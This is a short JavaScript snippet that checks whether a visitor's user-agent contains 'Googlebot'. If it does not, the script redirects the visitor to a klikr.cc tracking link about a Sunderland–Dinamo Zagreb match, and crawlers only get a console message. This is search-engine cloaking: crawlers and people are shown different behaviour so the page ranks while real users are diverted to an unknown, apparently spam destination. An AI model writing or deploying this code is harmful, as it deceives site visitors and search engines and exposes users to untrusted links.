// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://klikr.cc/sanderlend-dinamo-zagreb-05-11-2026?s=blog-sanderlend-dinamo-zagreb-1";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
